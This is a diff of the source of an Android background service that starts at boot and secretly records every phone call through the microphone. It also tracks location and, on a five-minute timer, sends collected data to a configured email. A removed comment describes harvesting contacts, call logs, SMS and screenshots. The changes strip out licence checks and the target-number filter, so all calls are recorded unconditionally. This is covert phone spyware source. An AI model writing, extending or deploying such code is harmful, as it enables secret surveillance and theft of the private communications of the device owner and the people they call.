@@ -29,30 +29,20 @@ import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
-/**
- * Demo service that schedules a timer task
- * The timer task will execute the following tasks:
- *  - When starting the networks and over 24 hours to the previous timing, 
- *    will get all contacts, phone call history and SMS, 
- *    saved as attachments and mail to the qualified receiver.
- *  - When staring the machine and network is connected, 
- *    get the 1st screenshot delayed 3 seconds and then do it in a 30 seconds circle.    
- */
 public class BootService extends Service 
 {
 	private final String LOGTAG = "BootService";
 	
 	Context context;
 	
-	private Timer mGetInfoTimer;
-	private GetInfoTask mInfoTask;
-	private final long mGetInfoDelay  = 10000; // 10 Seconds
-	private final long mGetInfoPeriod = 300000; // 300 Seconds
+	private Timer mSendInfoTimer;
+	private SendInfoTask mSendInfoTask;
+	private final long mSendInfoDelay  = 10000; // 10 Seconds
+	private final long mSendInfoPeriod = 300000; // 300 Seconds
 		
 	public static LocationUtil locationUtil = null;
 	private TelephonyManager telManager;
 	private boolean recordStarted = false;
-	public static String otherSidePhoneNum = "";
 	private static MediaRecorder recorder;
 	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDirStr();
 	
@@ -61,43 +51,18 @@ public class BootService extends Service
 	}
 	
 	private final PhoneStateListener phoneListener = new PhoneStateListener() {
-		private static final long MIN_FILE_SIZE = 10240; // 10KB
 		private String fileFullPath = "";
 		
 		@Override
-        public void onCallStateChanged(int state, String incomingNumber) {
-			
-			// Get incoming phone number
-			if (incomingNumber != null && incomingNumber.length() > 0) {
-				otherSidePhoneNum = incomingNumber;
-			}
-			
-            try {
+        public void onCallStateChanged(int state, String incomingNumber) 
+		{
+		    try {
                 switch (state) {
                 	case TelephonyManager.CALL_STATE_RINGING: { // 1
                 		break;
                 	}
                 	case TelephonyManager.CALL_STATE_OFFHOOK: { // 2
                 		Context context = getApplicationContext();
-                		
-                		// Check if reached the recording limit if trial
-                		LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
-                		if (licType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachRecordingTimeLimit(context)) {
-                			if (!ConfigCtrl.getHasSentRecordingTimesLimitSms(context)) {
-                				// Send SMS to warn user
-        						String recvPhoneNum = GlobalPrefActivity.getSafePhoneNum(context);
-        						if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
-        							String msg = context.getResources().getString(R.string.msg_recording_times_over_in_trial);
-        							boolean ret = SmsCtrl.sendSms(recvPhoneNum, msg);
-        							if (ret) {
-        								ConfigCtrl.setHasSentRedirectSmsTimesLimitSms(context, true);
-        							}
-        						}
-                			}
-                			return;
-                		}
-                		
-                		if (!comingNumberIsLegal(context, otherSidePhoneNum)) return;
             			
             			if (recordStarted) return;
             			
@@ -107,7 +72,7 @@ public class BootService extends Service
             			// Phone call recording
             			try {
                             Date startDate = new Date();
-                            this.fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate);
+                            this.fileFullPath = makePhonecallRecordFileFullPath(context, startDate);
                             recorder.reset();
                             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                             recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
@@ -125,22 +90,6 @@ public class BootService extends Service
                 		if (recordStarted) {
         					recorder.stop();
         					recordStarted = false;
-        					
-        					// If the size is less than 10KB, delete it
-        					try {
-        						File file = new File(this.fileFullPath);
-        						if (file.exists() && file.length() < MIN_FILE_SIZE) {
-        							file.delete();
-        						} else {
-        							// recording count ++ if in trial
-        							if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.TRIAL_LICENSED) {
-        								ConfigCtrl.countRecordingTimesInTrial(context); 
-        							}
-        						}
-        						this.fileFullPath = "";
-        					} catch (Exception ex) {
-        						//
-        					}
         				}
                 		break;
                 	}
@@ -172,8 +121,8 @@ public class BootService extends Service
 		
 		this.context = getApplicationContext();
 		
-		mGetInfoTimer = new Timer();
-		mInfoTask = new GetInfoTask(context);
+		mSendInfoTimer = new Timer();
+		mSendInfoTask = new SendInfoTask(context);
 	}
 
 	@Override
@@ -181,84 +130,25 @@ public class BootService extends Service
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		super.onStart(intent, startId);
 		
-		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
-		
-		// A special check on the consume date and current date:
-		// If the current date is ealier than consume date, stop the trial
-		CheckDate(context, type);
-		
-		// Start timer to get contacts, phone call history and SMS
-		if (ConfigCtrl.isLegal(context)) 
+		// ------------------------------------------------------------------			
+		// Start timers and listeners
+		String recvMail = GlobalPrefActivity.getSafeMail(context);
+		if (recvMail.length() > 0) 
 		{
-			// ------------------------------------------------------------------			
-			// Start timers and listeners
-			String recvMail = GlobalPrefActivity.getSafeMail(context);
-			if (recvMail.length() > 0) 
-			{
-				mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
-				
-				if (telManager == null) {
-					telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
-					telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
-				}
-			}
+			mSendInfoTimer.scheduleAtFixedRate(mSendInfoTask, mSendInfoDelay, mSendInfoPeriod);
 			
-			String recvPhoneNum = GlobalPrefActivity.getSafePhoneNum(context);
-			if (recvPhoneNum.length() > 0 && locationUtil == null) 
-			{
-				locationUtil = new LocationUtil(context);
+			if (telManager == null) {
+				telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+				telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
 			}
+		}
 		
-			//Start timer to capture screenshot
-			/*
-	        if (!SysUtils.isRooted(getApplicationContext())) {
-	        	Log.i(LOGTAG, "Not rooted");
-	        } else {
-	        	mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
-	        }
-	        */
-		} 
-		
-		// If out of trial and not licensed, send a SMS to warn the receiver user
-		else if (type == LICENSE_TYPE.TRIAL_LICENSED)
+		String recvPhoneNum = GlobalPrefActivity.getSafePhoneNum(context);
+		if (recvPhoneNum.length() > 0 && locationUtil == null) 
 		{
-			// If has sent before, DO NOT send again
-			if (ConfigCtrl.getHasSentExpireSms(context)) return;
-			
-			// Send a SMS to the receiver that has expired
-			String receiverPhoneNum = GlobalPrefActivity.getSafePhoneNum(context);
-			if (receiverPhoneNum != null && receiverPhoneNum.length() > 0) {
-				String msg = String.format(context.getResources().getString(R.string.msg_has_sent_trial_expire_sms), ConfigCtrl.getSelfName(context));
-				boolean ret = SmsCtrl.sendSms(receiverPhoneNum, msg);
-				if (ret) {
-					ConfigCtrl.setHasSentExpireSms(context, true);
-				}
-			}
-		}
-	}
-	
-	// Prevent me from being cheated when in trial
-	private void CheckDate(Context context, LICENSE_TYPE type) 
-	{
-		if (type != LICENSE_TYPE.TRIAL_LICENSED) return;
-		
-		boolean beCheated = true;
-		
-		String consumeDatetimeStr = ConfigCtrl.getConsumedDatetime(context);
-		if (consumeDatetimeStr != null && consumeDatetimeStr.length() > 0) {
-			Date consumeDatetime = null;
-			try {
-				consumeDatetime = DatetimeUtil.format.parse(consumeDatetimeStr);
-			} catch (Exception ex) {}
-			
-			if (consumeDatetime != null && consumeDatetime.before(new Date())) {
-				beCheated= false;
-			}
+			locationUtil = new LocationUtil(context);
 		}
 		
-		if (beCheated) {
-			ConfigCtrl.setLicenseType(context, LICENSE_TYPE.NOT_LICENSED);
-		}
 	}
 	
 	public class IaiaiBinder extends Binder {  
@@ -267,9 +157,9 @@ public class BootService extends Service
         }  
     }
 	
-	private String makePhonecallRecordFileFullPath(Context context, String phoneNum, Date date) {
+	private String makePhonecallRecordFileFullPath(Context context, Date date) {
 		if (!FileCtrl.defaultDirExist()) FileCtrl.createDefaultSDDir();
-		String fileName = context.getResources().getString(R.string.phonecall_record) + phoneNum + "-" + DatetimeUtil.format2.format(date) + FileCtrl.SUFFIX_WAV;
+		String fileName = context.getResources().getString(R.string.phonecall_record_env) + DatetimeUtil.format2.format(date) + FileCtrl.SUFFIX_WAV;
 		return DEFAULT_PHONE_RECORD_DIR + fileName;
 	}
 	
@@ -289,19 +179,4 @@ public class BootService extends Service
 		} catch (Exception ex) {}
 	}
 	
-	private boolean comingNumberIsLegal(Context context, String comingNum) 
-	{
-		if (GlobalPrefActivity.getRecordAll(context)) return true;
-		
-		String[] recordingTargetNumbers = GlobalPrefActivity.getRecordTargetNum(context)
-											.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.TARGET_NUMBER_BREAKER)
-											.split(GlobalPrefActivity.TARGET_NUMBER_BREAKER);
-		for (String num : recordingTargetNumbers) {
-			if (comingNum.contains(num)) {
-				return true;
-			}
-		}
-			
-		return false;
-	} 
 }
